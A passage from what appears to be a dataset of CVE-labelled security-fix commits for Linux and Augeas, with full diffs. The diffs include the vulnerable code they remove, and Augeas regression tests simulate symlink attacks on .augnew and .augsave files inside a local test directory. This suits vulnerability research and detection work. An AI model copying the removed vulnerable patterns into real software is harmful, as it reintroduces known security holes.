NULL;\n-\t\tif (file)\n-\t\t\treturn -EINVAL;\n-\n-\t\t/*\n-\t\t * VM_NORESERVE is used because the reservations will be\n-\t\t * taken when vm_ops->mmap() is called\n-\t\t * A dummy user value is used because we are not locking\n-\t\t * memory so no accounting is necessary\n-\t\t */\n-\t\tlen = ALIGN(len, huge_page_size(&default_hstate));\n-\t\tfile = hugetlb_file_setup(HUGETLB_ANON_FILE, len, VM_NORESERVE,\n-\t\t\t\t\t\t&user, HUGETLB_ANONHUGE_INODE);\n-\t\tif (IS_ERR(file))\n-\t\t\treturn PTR_ERR(file);\n-\t}\n-\n \t/* Obtain the address to map to. we verify (or select) it and ensure\n \t * that it represents a valid section of the address space.\n \t */\ndiff --git a/mm/util.c b/mm/util.c\nindex 3bf81b294ae8..b377ce430803 100644\n--- a/mm/util.c\n+++ b/mm/util.c\n@@ -280,9 +280,24 @@ SYSCALL_DEFINE6(mmap_pgoff, unsigned long, addr, unsigned long, len,\n \tunsigned long retval = -EBADF;\n \n \tif (!(flags & MAP_ANONYMOUS)) {\n+\t\tif (unlikely(flags & MAP_HUGETLB))\n+\t\t\treturn -EINVAL;\n \t\tfile = fget(fd);\n \t\tif (!file)\n \t\t\tgoto out;\n+\t} else if (flags & MAP_HUGETLB) {\n+\t\tstruct user_struct *user = NULL;\n+\t\t/*\n+\t\t * VM_NORESERVE is used because the reservations will be\n+\t\t * taken when vm_ops->mmap() is called\n+\t\t * A dummy user value is used because we are not locking\n+\t\t * memory so no accounting is necessary\n+\t\t */\n+\t\tlen = ALIGN(len, huge_page_size(&default_hstate));\n+\t\tfile = hugetlb_file_setup(HUGETLB_ANON_FILE, len, VM_NORESERVE,\n+\t\t\t\t\t\t&user, HUGETLB_ANONHUGE_INODE);\n+\t\tif (IS_ERR(file))\n+\t\t\treturn PTR_ERR(file);\n \t}\n \n \tflags &= ~(MAP_EXECUTABLE | MAP_DENYWRITE);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "mjg59", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2012-6607", "CWE_ID": "22", "category": "security", "commit_id": "163877441402e464266b45ee98e24bb652971def", "commit_message": "From 163877441402e464266b45ee98e24bb652971def Mon Sep 17 00:00:00 2001\nFrom: Dominic Cleal <dcleal@redhat.com>\nDate: Sun, 12 Feb 2012 21:41:37 +0000\nSubject: [PATCH] Prevent symlink attacks via .augnew during saving\n\nInstead of saving into a predictable PATH.augnew file, save into a securely\ncreated PATH.augnew.XXXXXX\n\n* src/transform.c (transform_save):\n    write changes to a temporary file in the same directory as the destination\n    (either the file's canonical path or the path of .augnew), before renaming\n\n* src/transform.c (transfer_file_attrs):\n    use fchown, fchmod etc. on the same file handles to ensure consistent\n    permission changes\n\n* bootstrap: add mkstemp gnulib module\n* tests/\n    test-put-symlink-augnew.sh: test symlink attack when writing .augnew\n    test-put-symlink-augsave.sh: test symlink attack when writing .augsave\n    test-put-symlink-augtemp.sh: test symlink attack via temp .augnew\n    test-put-symlink.sh: also test file modification\n\nFixes BZ 772257\n---\n bootstrap                         |   1 +\n src/internal.c                    |  15 +++-\n src/internal.h                    |   3 +\n src/transform.c                   | 141 +++++++++++++++++++-----------\n tests/Makefile.am                 |   3 +-\n tests/test-put-symlink-augnew.sh  |  52 +++++++++++\n tests/test-put-symlink-augsave.sh |  52 +++++++++++\n tests/test-put-symlink-augtemp.sh |  52 +++++++++++\n tests/test-put-symlink.sh         |   5 ++\n tests/test-save-empty.sh          |   5 +-\n 10 files changed, 270 insertions(+), 59 deletions(-)\n create mode 100755 tests/test-put-symlink-augnew.sh\n create mode 100755 tests/test-put-symlink-augsave.sh\n create mode 100755 tests/test-put-symlink-augtemp.sh\n\n", "diff_code": "diff --git a/bootstrap b/bootstrap\nindex 4240dab9..22e64609 100755\n--- a/bootstrap\n+++ b/bootstrap\n@@ -72,6 +72,7 @@ gitlog-to-changelog\n canonicalize-lgpl\n isblank\n locale\n+mkstemp\n regex\n safe-alloc\n selinux-h\ndiff --git a/src/internal.c b/src/internal.c\nindex 566498d0..44956f81 100644\n--- a/src/internal.c\n+++ b/src/internal.c\n@@ -125,8 +125,7 @@ fread_file_lim (FILE *stream, size_t max_len, size_t *length)\n     return NULL;\n }\n \n-char* xread_file(const char *path) {\n-    FILE *fp = fopen(path, \"r\");\n+char* xfread_file(FILE *fp) {\n     char *result;\n     size_t len;\n \n@@ -134,7 +133,6 @@ char* xread_file(const char *path) {\n         return NULL;\n \n     result = fread_file_lim(fp, MAX_READ_LEN, &len);\n-    fclose (fp);\n \n     if (result != NULL\n         && len <= MAX_READ_LEN\n@@ -145,6 +143,17 @@ char* xread_file(const char *path) {\n     return NULL;\n }\n \n+char* xread_file(const char *path) {\n+    FILE *fp;\n+    char *result;\n+\n+    fp = fopen(path, \"r\");\n+    result = xfread_file(fp);\n+    fclose (fp);\n+\n+    return result;\n+}\n+\n /*\n  * Escape/unescape of string literals\n  */\ndiff --git a/src/internal.h b/src/internal.h\nindex 064c5d11..933722c9 100644\n--- a/src/internal.h\n+++ b/src/internal.h\n@@ -287,6 +287,9 @@ char *format_pos(const char *text, int pos);\n  */\n char* xread_file(const char *path);\n \n+/* Like xread_file, but caller supplies a file pointer */\n+char* xfread_file(FILE *fp);\n+\n /* Get the error message for ERRNUM in a threadsafe way. Based on libvirt's\n  * virStrError\n  */\ndiff --git a/src/transform.c b/src/transform.c\nindex 39bfa50f..6ebcbd69 100644\n--- a/src/transform.c\n+++ b/src/transform.c\n@@ -799,35 +799,38 @@ int transform_applies(struct tree *xfm, const char *path) {\n     return filter_matches(xfm, path + strlen(AUGEAS_FILES_TREE));\n }\n \n-static int transfer_file_attrs(const char *from, const char *to,\n+static int transfer_file_attrs(FILE *from, FILE *to,\n                                const char **err_status) {\n     struct stat st;\n     int ret = 0;\n     int selinux_enabled = (is_selinux_enabled() > 0);\n     security_context_t con = NULL;\n \n-    ret = lstat(from, &st);\n+    int from_fd = fileno(from);\n+    int to_fd = fileno(to);\n+\n+    ret = fstat(from_fd, &st);\n     if (ret < 0) {\n         *err_status = \"replace_stat\";\n         return -1;\n     }\n     if (selinux_enabled) {\n-        if (lgetfilecon(from, &con) < 0 && errno != ENOTSUP) {\n+        if (fgetfilecon(from_fd, &con) < 0 && errno != ENOTSUP) {\n             *err_status = \"replace_getfilecon\";\n             return -1;\n         }\n     }\n \n-    if (lchown(to, st.st_uid, st.st_gid) < 0) {\n+    if (fchown(to_fd, st.st_uid, st.st_gid) < 0) {\n         *err_status = \"replace_chown\";\n         return -1;\n     }\n-    if (chmod(to, st.st_mode) < 0) {\n+    if (fchmod(to_fd, st.st_mode) < 0) {\n         *err_status = \"replace_chmod\";\n         return -1;\n     }\n     if (selinux_enabled && con != NULL) {\n-        if (lsetfilecon(to, con) < 0 && errno != ENOTSUP) {\n+        if (fsetfilecon(to_fd, con) < 0 && errno != ENOTSUP) {\n             *err_status = \"replace_setfilecon\";\n             return -1;\n         }\n@@ -869,7 +872,7 @@ static int clone_file(const char *from, const char *to,\n         goto done;\n     }\n \n-    if (transfer_file_attrs(from, to, err_status) < 0)\n+    if (transfer_file_attrs(from_fp, to_fp, err_status) < 0)\n         goto done;\n \n     while ((len = fread(buf, 1, BUFSIZ, from_fp)) > 0) {\n@@ -946,19 +949,38 @@ static int file_saved_event(struct augeas *aug, const char *path) {\n  * are noted in the /augeas/files hierarchy in AUG->ORIGIN under\n  * PATH/error.\n  *\n- * Writing the file happens by first writing into PATH.augnew, transferring\n- * all file attributes of PATH to PATH.augnew, and then renaming\n- * PATH.augnew to PATH. If the rename fails, and the entry\n- * AUGEAS_COPY_IF_FAILURE exists in AUG->ORIGIN, PATH is overwritten by\n- * copying file contents\n+ * Writing the file happens by first writing into a temp file, transferring all\n+ * file attributes of PATH to the temp file, and then renaming the temp file\n+ * back to PATH.\n+ *\n+ * Temp files are created alongside the destination file to enable the rename,\n+ * which may be the canonical path (PATH_canon) if PATH is a symlink.\n+ *\n+ * If the AUG_SAVE_NEWFILE flag is set, instead rename to PATH.augnew rather\n+ * than PATH.  If AUG_SAVE_BACKUP is set, move the original to PATH.augsave.\n+ * (Always PATH.aug{new,save} irrespective of whether PATH is a symlink.)\n+ *\n+ * If the rename fails, and the entry AUGEAS_COPY_IF_FAILURE exists in\n+ * AUG->ORIGIN, PATH is instead overwritten by copying file contents.\n+ *\n+ * The table below shows the locations for each permutation.\n+ *\n+ * PATH       save flag    temp file           dest file      backup?\n+ * regular    -            PATH.augnew.XXXX    PATH           -\n+ * regular    BACKUP       PATH.augnew.XXXX    PATH           PATH.augsave\n+ * regular    NEWFILE      PATH.augnew.XXXX    PATH.augnew    -\n+ * symlink    -            PATH_canon.XXXX     PATH_canon     -\n+ * symlink    BACKUP       PATH_canon.XXXX     PATH_canon     PATH.augsave\n+ * symlink    NEWFILE      PATH.augnew.XXXX    PATH.augnew    -\n  *\n  * Return 0 on success, -1 on failure.\n  */\n int transform_save(struct augeas *aug, struct tree *xfm,\n                    const char *path, struct tree *tree) {\n-    FILE *fp = NULL;\n-    char *augnew = NULL, *augorig = NULL, *augsave = NULL;\n-    char *augorig_canon = NULL;\n+    int   fd;\n+    FILE *fp = NULL, *augorig_canon_fp = NULL;\n+    char *augtemp = NULL, *augnew = NULL, *augorig = NULL, *augsave = NULL;\n+    char *augorig_canon = NULL, *augdest = NULL;\n     int   augorig_exists;\n     int   copy_if_rename_fails = 0;\n     char *text = NULL;\n@@ -986,19 +1008,6 @@ int transform_save(struct augeas *aug, struct tree *xfm,\n         goto done;\n     }\n \n-    if (access(augorig, R_OK) == 0) {\n-        text = xread_file(augorig);\n-    } else {\n-        text = strdup(\"\");\n-    }\n-\n-    if (text == NULL) {\n-        err_status = \"put_read\";\n-        goto done;\n-    }\n-\n-    text = append_newline(text, strlen(text));\n-\n     augorig_canon = canonicalize_file_name(augorig);\n     augorig_exists = 1;\n     if (augorig_canon == NULL) {\n@@ -1011,31 +1020,53 @@ int transform_save(struct augeas *aug, struct tree *xfm,\n         }\n     }\n \n-    /* Figure out where to put the .augnew file. If we need to rename it\n-       later on, put it next to augorig_canon */\n+    if (access(augorig_canon, R_OK) == 0) {\n+        augorig_canon_fp = fopen(augorig_canon, \"r\");\n+        text = xfread_file(augorig_canon_fp);\n+    } else {\n+        text = strdup(\"\");\n+    }\n+\n+    if (text == NULL) {\n+        err_status = \"put_read\";\n+        goto done;\n+    }\n+\n+    text = append_newline(text, strlen(text));\n+\n+    /* Figure out where to put the .augnew and temp file. If no .augnew file\n+       then put the temp file next to augorig_canon, else next to .augnew. */\n     if (aug->flags & AUG_SAVE_NEWFILE) {\n         if (xasprintf(&augnew, \"%s\" EXT_AUGNEW, augorig) < 0) {\n             err_status = \"augnew_oom\";\n             goto done;\n         }\n+        augdest = augnew;\n     } else {\n-        if (xasprintf(&augnew, \"%s\" EXT_AUGNEW, augorig_canon) < 0) {\n-            err_status = \"augnew_oom\";\n-            goto done;\n-        }\n+        augdest = augorig_canon;\n+    }\n+\n+    if (xasprintf(&augtemp, \"%s.XXXXXX\", augdest) < 0) {\n+        err_status = \"augtemp_oom\";\n+        goto done;\n     }\n \n     // FIXME: We might have to create intermediate directories\n     // to be able to write augnew, but we have no idea what permissions\n     // etc. they should get. Just the process default ?\n-    fp = fopen(augnew, \"w\");\n+    fd = mkstemp(augtemp);\n+    if (fd < 0) {\n+        err_status = \"mk_augtemp\";\n+        goto done;\n+    }\n+    fp = fdopen(fd, \"w\");\n     if (fp == NULL) {\n-        err_status = \"open_augnew\";\n+        err_status = \"open_augtemp\";\n         goto done;\n     }\n \n     if (augorig_exists) {\n-        if (transfer_file_attrs(augorig_canon, augnew, &err_status) != 0) {\n+        if (transfer_file_attrs(augorig_canon_fp, fp, &err_status) != 0) {\n             err_status = \"xfer_attrs\";\n             goto done;\n         }\n@@ -1045,22 +1076,22 @@ int transform_save(struct augeas *aug, struct tree *xfm,\n         lns_put(fp, lens, tree->children, text, &err);\n \n     if (ferror(fp)) {\n-        err_status = \"error_augnew\";\n+        err_status = \"error_augtemp\";\n         goto done;\n     }\n \n     if (fflush(fp) != 0) {\n-        err_status = \"flush_augnew\";\n+        err_status = \"flush_augtemp\";\n         goto done;\n     }\n \n     if (fsync(fileno(fp)) < 0) {\n-        err_status = \"sync_augnew\";\n+        err_status = \"sync_augtemp\";\n         goto done;\n     }\n \n     if (fclose(fp) != 0) {\n-        err_status = \"close_augnew\";\n+        err_status = \"close_augtemp\";\n         fp = NULL;\n         goto done;\n     }\n@@ -1069,33 +1100,33 @@ int transform_save(struct augeas *aug, struct tree *xfm,\n \n     if (err != NULL) {\n         err_status = err->pos >= 0 ? \"parse_skel_failed\" : \"put_failed\";\n-        unlink(augnew);\n+        unlink(augtemp);\n         goto done;\n     }\n \n     {\n-        char *new_text = xread_file(augnew);\n+        char *new_text = xread_file(augtemp);\n         int same = 0;\n         if (new_text == NULL) {\n-            err_status = \"read_augnew\";\n+            err_status = \"read_augtemp\";\n             goto done;\n         }\n         same = STREQ(text, new_text);\n         FREE(new_text);\n         if (same) {\n             result = 0;\n-            unlink(augnew);\n+            unlink(augtemp);\n             goto done;\n         } else if (aug->flags & AUG_SAVE_NOOP) {\n             result = 1;\n-            unlink(augnew);\n+            unlink(augtemp);\n             goto done;\n         }\n     }\n \n     if (!(aug->flags & AUG_SAVE_NEWFILE)) {\n         if (augorig_exists && (aug->flags & AUG_SAVE_BACKUP)) {\n-            r = asprintf(&augsave, \"%s%s\" EXT_AUGSAVE, aug->root, filename);\n+            r = xasprintf(&augsave, \"%s\" EXT_AUGSAVE, augorig);\n             if (r == -1) {\n                 augsave = NULL;\n                 goto done;\n@@ -1107,13 +1138,14 @@ int transform_save(struct augeas *aug, struct tree *xfm,\n                 goto done;\n             }\n         }\n-        r = clone_file(augnew, augorig_canon, &err_status,\n-                       copy_if_rename_fails);\n-        if (r != 0) {\n-            dyn_err_status = strappend(err_status, \"_augnew\");\n-            goto done;\n-        }\n     }\n+\n+    r = clone_file(augtemp, augdest, &err_status, copy_if_rename_fails);\n+    if (r != 0) {\n+        dyn_err_status = strappend(err_status, \"_augtemp\");\n+        goto done;\n+    }\n+\n     result = 1;\n \n  done:\n@@ -1138,6 +1170,7 @@ int transform_save(struct augeas *aug, struct tree *xfm,\n     free(dyn_err_status);\n     lens_release(lens);\n     free(text);\n+    free(augtemp);\n     free(augnew);\n     if (augorig_canon != augorig)\n         free(augorig_canon);\n@@ -1147,6 +1180,8 @@ int transform_save(struct augeas *aug, struct tree *xfm,\n \n     if (fp != NULL)\n         fclose(fp);\n+    if (augorig_canon_fp != NULL)\n+        fclose(augorig_canon_fp);\n     return result;\n }\n \ndiff --git a/tests/Makefile.am b/tests/Makefile.am\nindex d8537773..f6645378 100644\n--- a/tests/Makefile.am\n+++ b/tests/Makefile.am\n@@ -183,7 +183,8 @@ check_SCRIPTS = \\\n   test-interpreter.sh \\\n   $(lens_tests) \\\n   test-get.sh test-augtool.sh \\\n-  test-put-symlink.sh test-save-empty.sh \\\n+  test-put-symlink.sh test-put-symlink-augnew.sh \\\n+  test-put-symlink-augsave.sh test-put-symlink-augtemp.sh test-save-empty.sh \\\n   test-bug-1.sh test-idempotent.sh test-preserve.sh \\\n   test-events-saved.sh test-save-mode.sh test-unlink-error.sh \\\n   test-augtool-empty-line.sh test-augtool-modify-root.sh\ndiff --git a/tests/test-put-symlink-augnew.sh b/tests/test-put-symlink-augnew.sh\nnew file mode 100755\nindex 00000000..eb361dfa\n--- /dev/null\n+++ b/tests/test-put-symlink-augnew.sh\n@@ -0,0 +1,52 @@\n+#! /bin/bash\n+\n+# Test that we don't follow symlinks when writing to .augnew\n+\n+ROOT=$abs_top_builddir/build/test-put-symlink-augnew\n+LENSES=$abs_top_srcdir/lenses\n+\n+HOSTS=$ROOT/etc/hosts\n+HOSTS_AUGNEW=${HOSTS}.augnew\n+\n+ATTACK_FILE=$ROOT/other/attack\n+\n+rm -rf $ROOT\n+mkdir -p $(dirname $HOSTS)\n+mkdir -p $(dirname $ATTACK_FILE)\n+\n+cat <<EOF > $HOSTS\n+127.0.0.1 localhost\n+EOF\n+touch $ATTACK_FILE\n+\n+(cd $(dirname $HOSTS) && ln -s ../other/attack $(basename $HOSTS).augnew)\n+\n+HOSTS_SUM=$(sum $HOSTS)\n+\n+augtool --nostdinc -I $LENSES -r $ROOT --new > /dev/null <<EOF\n+set /files/etc/hosts/1/alias myhost\n+save\n+EOF\n+\n+if [ ! -f $HOSTS ] ; then\n+    echo \"/etc/hosts is no longer a regular file\"\n+    exit 1\n+fi\n+if [ ! \"x${HOSTS_SUM}\" = \"x$(sum $HOSTS)\" ]; then\n+    echo \"/etc/hosts has changed\"\n+    exit 1\n+fi\n+\n+if [ ! -f $HOSTS_AUGNEW ] ; then\n+    echo \"/etc/hosts.augnew is still a symlink, should be unlinked\"\n+    exit 1\n+fi\n+if ! grep myhost $HOSTS_AUGNEW >/dev/null; then\n+    echo \"/etc/hosts does not contain the modification\"\n+    exit 1\n+fi\n+\n+if [ -s $ATTACK_FILE ]; then\n+    echo \"/other/attack now contains data, should be blank\"\n+    exit 1\n+fi\ndiff --git a/tests/test-put-symlink-augsave.sh b/tests/test-put-symlink-augsave.sh\nnew file mode 100755\nindex 00000000..8b4dbcf7\n--- /dev/null\n+++ b/tests/test-put-symlink-augsave.sh\n@@ -0,0 +1,52 @@\n+#! /bin/bash\n+\n+# Test that we don't follow .augsave symlinks\n+\n+ROOT=$abs_top_builddir/build/test-put-symlink-augsave\n+LENSES=$abs_top_srcdir/lenses\n+\n+HOSTS=$ROOT/etc/hosts\n+HOSTS_AUGSAVE=${HOSTS}.augsave\n+\n+ATTACK_FILE=$ROOT/other/attack\n+\n+rm -rf $ROOT\n+mkdir -p $(dirname $HOSTS)\n+mkdir -p $(dirname $ATTACK_FILE)\n+\n+cat <<EOF > $HOSTS\n+127.0.0.1 localhost\n+EOF\n+HOSTS_SUM=$(sum $HOSTS)\n+\n+touch $ATTACK_FILE\n+(cd $(dirname $HOSTS) && ln -s ../other/attack $(basename $HOSTS).augsave)\n+\n+# Now ask for the original to be saved in .augsave\n+augtool --nostdinc -I $LENSES -r $ROOT --backup > /dev/null <<EOF\n+set /files/etc/hosts/1/alias myhost\n+save\n+EOF\n+\n+if [ ! -f $HOSTS ] ; then\n+    echo \"/etc/hosts is no longer a regular file\"\n+    exit 1\n+fi\n+if [ ! -f $HOSTS_AUGNEW ] ; then\n+    echo \"/etc/hosts.augsave is still a symlink, should be unlinked\"\n+    exit 1\n+fi\n+\n+if [ ! \"x${HOSTS_SUM}\" = \"x$(sum $HOSTS_AUGSAVE)\" ]; then\n+    echo \"/etc/hosts.augsave has changed from the original /etc/hosts\"\n+    exit 1\n+fi\n+if ! grep myhost $HOSTS >/dev/null; then\n+    echo \"/etc/hosts does not contain the modification\"\n+    exit 1\n+fi\n+\n+if [ -s $ATTACK_FILE ]; then\n+    echo \"/other/attack now contains data, should be blank\"\n+    exit 1\n+fi\ndiff --git a/tests/test-put-symlink-augtemp.sh b/tests/test-put-symlink-augtemp.sh\nnew file mode 100755\nindex 00000000..0076e642\n--- /dev/null\n+++ b/tests/test-put-symlink-augtemp.sh\n@@ -0,0 +1,52 @@\n+#! /bin/bash\n+\n+# Test that we don't follow .augnew symlinks (regression test)\n+\n+ROOT=$abs_top_builddir/build/test-put-symlink-augtemp\n+LENSES=$abs_top_srcdir/lenses\n+\n+HOSTS=$ROOT/etc/hosts\n+HOSTS_AUGNEW=${HOSTS}.augnew\n+\n+ATTACK_FILE=$ROOT/other/attack\n+\n+rm -rf $ROOT\n+mkdir -p $(dirname $HOSTS)\n+mkdir -p $(dirname $ATTACK_FILE)\n+\n+cat <<EOF > $HOSTS\n+127.0.0.1 localhost\n+EOF\n+touch $ATTACK_FILE\n+\n+(cd $(dirname $HOSTS) && ln -s ../other/attack $(basename $HOSTS).augnew)\n+\n+# Test the normal save code path which would use a temp augnew file\n+augtool --nostdinc -I $LENSES -r $ROOT > /dev/null <<EOF\n+set /files/etc/hosts/1/alias myhost1\n+save\n+EOF\n+\n+if [ -h $HOSTS ] ; then\n+    echo \"/etc/hosts is now a symlink, pointing to\" $(readlink $HOSTS)\n+    exit 1\n+fi\n+if ! grep myhost1 $HOSTS >/dev/null; then\n+    echo \"/etc/hosts does not contain the modification\"\n+    exit 1\n+fi\n+\n+if [ ! -h $HOSTS_AUGNEW ] ; then\n+    echo \"/etc/hosts.augnew is not a symbolic link\"\n+    exit 1\n+fi\n+LINK=$(readlink $HOSTS_AUGNEW)\n+if [ \"x$LINK\" != \"x../other/attack\" ] ; then\n+    echo \"/etc/hosts.augnew no longer links to ../other/attack\"\n+    exit 1\n+fi\n+\n+if [ -s $ATTACK_FILE ]; then\n+    echo \"/other/attack now contains data, should be blank\"\n+    exit 1\n+fi\ndiff --git a/tests/test-put-symlink.sh b/tests/test-put-symlink.sh\nindex 6996b23c..64749eac 100755\n--- a/tests/test-put-symlink.sh\n+++ b/tests/test-put-symlink.sh\n@@ -41,3 +41,8 @@ if [ \"x$LINK\" != \"x../other/hosts\" ] ; then\n     echo \"/etc/hosts does not link to ../other/hosts\"\n     exit 1\n fi\n+\n+if ! grep myhost $REAL_HOSTS >/dev/null; then\n+    echo \"/other/hosts does not contain the modification\"\n+    exit 1\n+fi\ndiff --git a/tests/test-save-empty.sh b/tests/test-save-empty.sh\nindex 00741da4..847fd69d 100755\n--- a/tests/test-save-empty.sh\n+++ b/tests/test-save-empty.sh\n@@ -15,7 +15,7 @@ EOF\n \n expected_errors() {\n cat <<EOF\n-/augeas/files/etc/hosts/error = \"open_augnew\"\n+/augeas/files/etc/hosts/error = \"mk_augtemp\"\n /augeas/files/etc/hosts/error/message = \"No such file or directory\"\n EOF\n }\n@@ -30,7 +30,8 @@ EXPECTED=$(expected_errors)\n \n if [ \"$ACTUAL\" != \"$EXPECTED\" ]\n then\n-    echo \"No error on missing /etc directory\"\n+    echo \"No error on missing /etc directory:\"\n+    echo \"$ACTUAL\"\n     exit 1\n fi\n \n", "owner": "hercules-team", "repo": "augeas", "source": "cve"}
{"CVE_ID": "CVE-2014-0131", "CWE_ID": "416", "category": "security", "commit_id": "1fd819ecb90cc9b822cd84d3056ddba315d3340f", "commit_message": "From 1fd819ecb90cc9b822cd84d3056ddba315d3340f Mon Sep 17 00:00:00 2001\nFrom: \"Michael S. Tsirkin\" <mst@redhat.com>\nDate: Mon, 10 Mar 2014 19:28:08 +0200\nSubject: skbuff: skb_segment: orphan frags before copying\n\nskb_segment copies frags around, so we need\nto copy them carefully to avoid accessing\nuser memory after reporting completion to userspace\nthrough a callback.\n\nskb_segment doesn't normally happen on datapath:\nTSO needs to be disabled - so disabling zero copy\nin this case does not look like a big deal.\n\nSigned-off-by: Michael S. Tsirkin <mst@redhat.com>\nAcked-by: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/core/skbuff.c | 6 ++++++\n 1 file changed, 6 insertions(+)\n\n", "diff_code": "diff --git a/net/core/skbuff.c b/net/core/skbuff.c\nindex dc4f7683ff52..869c7afe3b07 100644\n--- a/net/core/skbuff.c\n+++ b/net/core/skbuff.c\n@@ -2854,6 +2854,7 @@ struct sk_buff *skb_segment(struct sk_buff *head_skb,\n \tskb_frag_t *frag = skb_shinfo(head_skb)->frags;\n \tunsigned int mss = skb_shinfo(head_skb)->gso_size;\n \tunsigned int doffset = head_skb->data - skb_mac_header(head_skb);\n+\tstruct sk_buff *frag_skb = head_skb;\n \tunsigned int offset = doffset;\n \tunsigned int tnl_hlen = skb_tnl_header_len(head_skb);\n \tunsigned int headroom;\n@@ -2898,6 +2899,7 @@ struct sk_buff *skb_segment(struct sk_buff *head_skb,\n \t\t\ti = 0;\n \t\t\tnfrags = skb_shinfo(list_skb)->nr_frags;\n \t\t\tfrag = skb_shinfo(list_skb)->frags;\n+\t\t\tfrag_skb = list_skb;\n \t\t\tpos += skb_headlen(list_skb);\n \n \t\t\twhile (pos < offset + len) {\n@@ -2985,6 +2987,7 @@ struct sk_buff *skb_segment(struct sk_buff *head_skb,\n \t\t\t\ti = 0;\n \t\t\t\tnfrags = skb_shinfo(list_skb)->nr_frags;\n \t\t\t\tfrag = skb_shinfo(list_skb)->frags;\n+\t\t\t\tfrag_skb = list_skb;\n \n \t\t\t\tBUG_ON(!nfrags);\n \n@@ -2999,6 +3002,9 @@ struct sk_buff *skb_segment(struct sk_buff *head_skb,\n \t\t\t\tgoto err;\n \t\t\t}\n \n+\t\t\tif (unlikely(skb_orphan_frags(frag_skb, GFP_ATOMIC)))\n+\t\t\t\tgoto err;\n+\n \t\t\t*nskb_frag = *frag;\n \t\t\t__skb_frag_ref(nskb_frag);\n \t\t\tsize = skb_frag_size(nskb_frag);\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2013-1956", "CWE_ID": "264", "category": "security", "commit_id": "3151527ee007b73a0ebd296010f1c0454a919c7d", "commit_message": "From 3151527ee007b73a0ebd296010f1c0454a919c7d Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Fri, 15 Mar 2013 01:45:51 -0700\nSubject: userns:  Don't allow creation if the user is chrooted\n\nGuarantee that the policy of which files may be access that is\nestablished by setting the root directory will not be violated\nby user namespaces by verifying that the root directory points\nto the root of the mount namespace at the time of user namespace\ncreation.\n\nChanging the root is a privileged operation, and as a matter of policy\nit serves to limit unprivileged processes to files below the current\nroot directory.\n\nFor reasons of simplicity and comprehensibility the privilege to\nchange the root directory is gated solely on the CAP_SYS_CHROOT\ncapability in the user namespace.  Therefore when creating a user\nnamespace we must ensure that the policy of which files may be access\ncan not be violated by changing the root directory.\n\nAnyone who runs a processes in a chroot and would like to use user\nnamespace can setup the same view of filesystems with a mount\nnamespace instead.  With this result that this is not a practical\nlimitation for using user namespaces.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge Hallyn <serge.hallyn@canonical.com>\nReported-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\n---\n fs/namespace.c            | 24 ++++++++++++++++++++++++\n include/linux/fs_struct.h |  2 ++\n kernel/user_namespace.c   |  9 +++++++++\n 3 files changed, 35 insertions(+)\n\n", "diff_code": "diff --git a/fs/namespace.c b/fs/namespace.c\nindex 50ca17d3cb45..a3035223d421 100644\n--- a/fs/namespace.c\n+++ b/fs/namespace.c\n@@ -2732,6 +2732,30 @@ bool our_mnt(struct vfsmount *mnt)\n \treturn check_mnt(real_mount(mnt));\n }\n \n+bool current_chrooted(void)\n+{\n+\t/* Does the current process have a non-standard root */\n+\tstruct path ns_root;\n+\tstruct path fs_root;\n+\tbool chrooted;\n+\n+\t/* Find the namespace root */\n+\tns_root.mnt = &current->nsproxy->mnt_ns->root->mnt;\n+\tns_root.dentry = ns_root.mnt->mnt_root;\n+\tpath_get(&ns_root);\n+\twhile (d_mountpoint(ns_root.dentry) && follow_down_one(&ns_root))\n+\t\t;\n+\n+\tget_fs_root(current->fs, &fs_root);\n+\n+\tchrooted = !path_equal(&fs_root, &ns_root);\n+\n+\tpath_put(&fs_root);\n+\tpath_put(&ns_root);\n+\n+\treturn chrooted;\n+}\n+\n static void *mntns_get(struct task_struct *task)\n {\n \tstruct mnt_namespace *ns = NULL;\ndiff --git a/include/linux/fs_struct.h b/include/linux/fs_struct.h\nindex 729eded4b24f..2b93a9a5a1e6 100644\n--- a/include/linux/fs_struct.h\n+++ b/include/linux/fs_struct.h\n@@ -50,4 +50,6 @@ static inline void get_fs_root_and_pwd(struct fs_struct *fs, struct path *root,\n \tspin_unlock(&fs->lock);\n }\n \n+extern bool current_chrooted(void);\n+\n #endif /* _LINUX_FS_STRUCT_H */\ndiff --git a/kernel/user_namespace.c b/kernel/user_namespace.c\nindex b14f4d342043..0f1e42884577 100644\n--- a/kernel/user_namespace.c\n+++ b/kernel/user_namespace.c\n@@ -61,6 +61,15 @@ int create_user_ns(struct cred *new)\n \tkgid_t group = new->egid;\n \tint ret;\n \n+\t/*\n+\t * Verify that we can not violate the policy of which files\n+\t * may be accessed that is specified by the root directory,\n+\t * by verifing that the root directory is at the root of the\n+\t * mount namespace which allows all files to be accessed.\n+\t */\n+\tif (current_chrooted())\n+\t\treturn -EPERM;\n+\n \t/* The creator needs a mapping in the parent user namespace\n \t * or else we won't be able to reasonably tell userspace who\n \t * created a user_namespace.\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2010-1488", "CWE_ID": "399", "category": "security", "commit_id": "b95c35e76b29ba812e5dabdd91592e25ec640e93", "commit_message": "From b95c35e76b29ba812e5dabdd91592e25ec640e93 Mon Sep 17 00:00:00 2001\nFrom: Oleg Nesterov <oleg@redhat.com>\nDate: Thu, 1 Apr 2010 15:13:57 +0200\nSubject: oom: fix the unsafe usage of badness() in proc_oom_score()\n\nproc_oom_score(task) has a reference to task_struct, but that is all.\nIf this task was already released before we take tasklist_lock\n\n\t- we can't use task->group_leader, it points to nowhere\n\n\t- it is not safe to call badness() even if this task is\n\t  ->group_leader, has_intersects_mems_allowed() assumes\n\t  it is safe to iterate over ->thread_group list.\n\n\t- even worse, badness() can hit ->signal == NULL\n\nAdd the pid_alive() check to ensure __unhash_process() was not called.\n\nAlso, use \"task\" instead of task->group_leader. badness() should return\nthe same result for any sub-thread. Currently this is not true, but\nthis should be changed anyway.\n\nSigned-off-by: Oleg Nesterov <oleg@redhat.com>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds 